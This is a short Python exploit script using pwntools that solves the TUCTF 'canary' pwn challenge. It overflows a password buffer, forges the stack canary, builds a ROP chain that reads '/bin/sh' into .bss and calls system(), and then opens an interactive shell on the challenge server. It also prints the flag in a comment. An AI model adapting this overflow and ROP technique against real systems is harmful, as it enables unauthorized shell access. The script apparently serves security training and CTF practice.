"""
TUCTF canary pwn challenge solution
"""
# Imports
import re, sys, time
from pwn import *

# Set pwntools context to i386
context.update(arch='i386')


def rop_payload(elf):
  """
  Creates a ROP payload to read a string into the bss section 
  of the binary then calls system using that string.
  """
  rop = ROP(elf)
  rop.read(0x0, elf.bss(0x20), 0x100)
  rop.system(elf.bss(0x20))

  return str(rop)


def main():
  """
  Runs on program execution.
  """
  # Read challenge binary into pwntools
  elf = ELF('canary')

  # Connect to the remote challenge
  p = remote('18.222.227.1', 12345)

  # Receive until user input
  print p.recvuntil('Password? ')

  # Send the password bypassing the canary (use offset 4) of cans value in bss
  p.sendline('A' * 40 + p32(0x00)  + p32(0x04) + 'C' * 0x04 + p32(0x080486B7)  + rop_payload(elf) + 'D' * 4)

  # Send the string '/bin/sh\x00' (used by rop_payload)
  p.sendline('/bin/sh\x00')

  # Interact with the shell
  p.interactive() # TUCTF{n3v3r_r0ll_y0ur_0wn_c4n4ry}

  
# Hook
if __name__ == '__main__':
  main()